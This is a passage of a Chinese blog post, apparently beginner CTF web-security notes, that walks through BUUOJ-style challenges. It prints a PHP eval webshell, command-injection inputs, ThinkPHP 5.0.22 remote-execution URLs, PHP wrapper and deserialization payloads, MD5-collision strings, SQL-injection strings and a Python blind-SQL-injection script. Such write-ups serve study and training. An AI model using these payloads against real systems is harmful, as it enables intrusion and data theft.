+<p>4.所谓的php一句话：<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code><br>这个是PHP最常见的一句话木马的源码，通过post木马程序来实现木马的植入，eval()函数把字符串按照PHP代码来计算，其长使用蚁剑和菜刀配合使用</p>
+<ol start="5">
+<li><p>尝试ping 127.0.0.1ping得通，尝试用&amp;&amp;符号执行多个命令 127.0.0.1 &amp;&amp; find / -name ‘flag.*’  //查找flag.开头文件</p>
+</li>
+<li><p><strong>phps文件就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</strong></p>
+<p><strong>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。</strong></p>
+<p><strong>提交的时候，要把 .phps 的 s 去掉 ，上面说了，index.phps不接受传参</strong></p>
+</li>
+<li><p>1.反序列化漏洞？</p>
+<p>php中提供两个函数可将任意类型数据转换成string类型，或逆过程。<br>Serizlaze<br>Unserialize<br>当unserialize的参数被用户控制时，就会形成反序列化漏洞。</p>
+</li>
+</ol>
+<p>2.魔术函数？<br>magic函数，通常以“__”开头（如__construct__destruct__toString__sleep__wakeup)<br>__toString当对象被以字符串输出时调用</p>
+<p>__sleep当对对象序列化时调用（如果存在的话），常用于提交未提交的数据<br>__wakeup当对对象反序列化时调用（如果存在的话），常用于重新建立数据库连接，或执行其他初始化操</p>
+<p>作</p>
+<h1 id="thinkphp-5-0-22"><a href="#thinkphp-5-0-22" class="headerlink" title="thinkphp 5.0.22"></a>thinkphp 5.0.22</h1><p>1、<a target="_blank" rel="noopener" href="http://192.168.1.1/thinkphp/public/?s=.%7Cthink%5Cconfig/get&amp;name=database.username">http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.username</a><br>2、<a target="_blank" rel="noopener" href="http://192.168.1.1/thinkphp/public/?s=.%7Cthink%5Cconfig/get&amp;name=database.password">http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.password</a><br>3、<a target="_blank" rel="noopener" href="http://url/to/thinkphp_5.0.22/?s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=id">http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</a><br>4、<a target="_blank" rel="noopener" href="http://url/to/thinkphp_5.0.22/?s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=1">http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</a></p>
+<p>1根据show_source(<strong>FILE</strong>);，以及题目中的文件include，这道题用文件动态包含拿flag</p>
+<p><strong>strstr()：</strong><br>定义和用法：<br><strong>搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。</strong><br>区分大小写，stristr()函数不区分大小写</p>
+<p>data伪协议代码执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=data://text/plain,&lt;?php system(<span class="string">&quot;ls&quot;</span>)?&gt;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200811115717675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01yX2hlbGxvd29yZA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>?page=data://text/plain,<?php system("cat fl4gisisish3r3.php")?></p>
+<p>文件上传</p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220114183335251.png" alt="image-20220114183335251"></p>
+<p>代码审计</p>
+<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
+<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
+<p>md5绕过</p>
+<p>强类型绕过<br>if((string)$_POST[‘a’] !== (string)$_POST[‘b’] &amp;&amp; md5($_POST[‘a’]) === md5($_POST[‘b’]))<br>1<br>[安洵杯 2019]easy_web（buu有环境） 的源码，第一次遇到这个，我直接懵逼</p>
+<p>上面的方法都不能用了，百度了一番才知道还有强类型绕过（这应该是md5碰撞了）</p>
+<p>payload如下：</p>
+<p>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<br>1<br>2<br>进行url解码后的MD5值相等</p>
+<p>收录一些MD5值相等的字符串</p>
+<p>$Param1=”\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2”;<br>$Param2=”\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2”;</p>
+<p>$data1=”\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70”;<br>$data2=”\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70”;</p>
+<p>ffifdyop MD5转换漏洞<br>MD5后    276f722736c95d99e921722cf9ed621c<br>转换成16字符的二进制格式    ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c<br>mysql自动解析成string    ‘or’6]!r,b<br>所以hint里的表达式就会变成：</p>
+<p>select * from ‘admin’ where password=’’or’6]!r,b’<br>1<br>当or后面接的是一个数字的话，sql语句就变成：</p>
+<p>select * from ‘admin’ where password=’’or true<br>1<br>就能执行sql语句了：</p>
+<p>常见的MD5碰撞（<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44348894/article/details/102955115%EF%BC%89%EF%BC%8C%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%EF%BC%9A">https://blog.csdn.net/weixin_44348894/article/details/102955115），数组绕过：</a></p>
+<p>再绕一次就拿到flag了。</p>
+<p>param1[]=1&amp;param2[]=2</p>
+<p>QNKCDZO<br>0e830400451993494058024219903391</p>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+<p>s155964671a<br>0e342768416822451524974117254469</p>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>1.根据提示有Java服务器直接下载WEB-INF/web.xml文件，可以发现有很多目录信息，知道到flag那个目录。</p>
+<p>2.用任意文件下载漏洞，下载.class文件</p>
+<p><a target="_blank" rel="noopener" href="http://474d75b8-e364-4c57-8ef8-884adee9e120.node4.buuoj.cn:81/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class">http://474d75b8-e364-4c57-8ef8-884adee9e120.node4.buuoj.cn:81/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</a></p>
+<p>post数据=WEB-INF/classes/com/wm/ctf/FlagController.class</p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fca92e56-c4c2-433c-9f67-5ad50754cba9.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">   <span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">   l = <span class="number">33</span></span><br><span class="line">   r =<span class="number">130</span></span><br><span class="line">   mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">   <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">      payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">      html = requests.post(url,data=payload)</span><br><span class="line">      <span class="built_in">print</span>(payload)</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">         l = mid+<span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">         r = mid</span><br><span class="line">      mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">   result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span> ,result)</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件包含反序列化漏洞"><a href="#文件包含反序列化漏洞" class="headerlink" title="文件包含反序列化漏洞"></a>文件包含反序列化漏洞</h3><p>[ZJCTF 2019]NiZhuanSiWei<br>目录</p>
+<p>[ZJCTF 2019]NiZhuanSiWei</p>
+<p> 题目：buu上的web题目，链接</p>
+<p>解题过程：</p>
+<p>第一层绕过：</p>
+<p>第二层绕过：</p>
+<p>第三层绕过：</p>
+<p> 最终的payload:</p>
+<p>相关链接：</p>
+<p> 题目：buu上的web题目，链接<br>题目：这个题目跟文件包含漏洞关联很大，通过这个题目，再巩固一下文件包含漏洞。</p>
+<p>解题过程：<br>打开题目后，代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+
+<p>第一层绕过：<br>if(isset($text)&amp;&amp;(file_get_contents($text,’r’)===”welcome to the zjctf”))<br> 要求我们传入一个text文件，内容为welcome to the zjctf，才能继续后面的步骤</p>
+<p> 先了解一下file_get_contents()函数，函数内容来源于网络</p>
+<p>可以用php://input伪协议以POST传参’welcome to the zjctf ‘</p>
+<p>也可以将文件内容通过data伪协议写进去，然后让file_get_contents()函数进行读取，payload如下</p>
+<p>?text=data://text/plain,welcome to the zjctf<br> 当然，保险起见还是应该将welcome to the zjctf进行base64编码然后再进行上传，不然可能会过滤（不过本题没有过滤）</p>
+<p>编码后的传参</p>
+<p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=<br> 回显：</p>
+<p>第二层绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">      <span class="keyword">exit</span>(); </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">      <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>正则过滤掉flag，而题目又提示了useless.php，所以用php://filter协议来读取useless.php，payload如下：</p>
+<p>正则过滤掉flag，而题目又提示了useless.php，所以用php://filter协议来读取useless.php，payload如下：</p>
+<p>?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php<br>回显：</p>
+<p>第三层绕过：<br>将base64编码进行解码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">在本地进行序列化操作，</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>序列化之后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line"> 最终的payload:</span><br><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>回显：</p>
+<p>查看f12得到flag.</p>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122144418229.png" alt="image-20220122144418229"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122144828834.png" alt="image-20220122144828834"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122145447131.png" alt="image-20220122145447131"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122145813725.png" alt="image-20220122145813725"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122150107444.png" alt="image-20220122150107444"></p>
+<p>绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>; ? &gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122152806185.png" alt="image-20220122152806185"></p>
+<h3 id="ctf-web视频知识点"><a href="#ctf-web视频知识点" class="headerlink" title="ctf web视频知识点"></a>ctf web视频知识点</h3><p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220115160458937.png" alt="image-20220115160458937"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220115161203477.png" alt="image-20220115161203477"><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220115162031362.png" alt="image-20220115162031362"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122142735351.png" alt="image-20220122142735351"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220122144039361.png" alt="image-20220122144039361"></p>
+<p>PHP进程流指stdout，它不会在web浏览器显示，所以在文件包含一般都是有input。</p>
+<p>命令执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))</span><br><span class="line">		mkdir(<span class="variable">$dir</span>);</span><br><span class="line">	chdir(<span class="variable">$dir</span>);</span><br><span class="line">	<span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arge&#x27;</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$arge</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\w+$/&#x27;</span>,<span class="variable">$arge</span>[<span class="variable">$i</span>]))</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	exec(<span class="string">&#x27;/bin/true &#x27;</span>.implode(<span class="string">&#x27; &#x27;</span>, <span class="variable">$arge</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220203144032823.png" alt="image-20220203144032823"></p>
+<h5 id="报错注入原理与利用"><a href="#报错注入原理与利用" class="headerlink" title="报错注入原理与利用"></a>报错注入原理与利用</h5><p>floor(rand(0)*2)报错 根据对应插入同名字段，导致出现冲突矛盾，使用concat连接数据信息</p>
+<p><a target="_blank" rel="noopener" href="http://121.43.141.153:60056/?id=1">http://121.43.141.153:60056/?id=1</a> </p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220203142634656.png" alt="image-20220203142634656"></p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220203141153382.png" alt="image-20220203141153382"></p>
+<p>and updatexml(1,concat(0x7e,version(),0x7e),1)</p>
+<p><img src="/2022/06/04/ctf%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/image-20220203142828273.png" alt="image-20220203142828273"></p>
+<h5 id="1-联合查询"><a href="#1-联合查询" class="headerlink" title="1.联合查询"></a>1.联合查询</h5><p>admin’ oorr 1=1 ununionion seselectlect 1,2,group_concat(passwoorrd) frfromom b4bsql limit 1,1;#</p>
+<h3 id="buuoj-web"><a href="#buuoj-web" class="headerlink" title="buuoj web"></a>buuoj web</h3><h6 id="buuoj-web2"><a href="#buuoj-web2" class="headerlink" title="buuoj web2"></a>buuoj web2</h6><p>用万能SQL密码</p>
+<p>/check.php?username=1’or 1=1%23&amp;password=1</p>
+<h6 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h6><p>首先考虑 <strong>“php://input”伪协议 + POST发送PHP代码</strong> 的经典套路</p>
+<p><a target="_blank" rel="noopener" href="https://img2018.cnblogs.com/i-beta/1212355/202002/1212355-20200228200320065-779194663.png"><img src="https://img2018.cnblogs.com/i-beta/1212355/202002/1212355-20200228200320065-779194663.png" alt="img"></a></p>
+<p>重新考虑之后使用 <strong>“php://filter”伪协议”</strong> 来进行包含。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p>
+<p>构造Payload: <strong>?file=php://filter/read=convert.base64-encode/resource=flag.php</strong></p>
+<p>这里需要注意的是使用php://filter伪协议进行文件包含时，需要加上<strong>read=convert.base64-encode</strong>来对文件内容进行编码</p>
+<p>发送请求得到base64编码后的flag.php文件源码:</p>
+<h6 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h6><p>view-source:http  查看源码</p>
+<p>猜测这里的MySQL语句结构应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from words where id=&#x27;$inject&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>构造Payload：用单引号+分号闭合前面的语句，插入SQL语句，再用注释符注释掉后面的语句即可</p>
+<p>先列出所有数据库：</p>
+<h6 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h6><p>命令执行，没啥说的，利用&amp;执行多条命令，输入127.0.0.1 &amp; cat /flag获得Flag:</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctfweb%E6%97%A9%E6%9C%9F%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/" rel="tag"># ctfweb早期入门笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/04/ctf%E7%A7%80/" rel="prev" title="ctf秀">
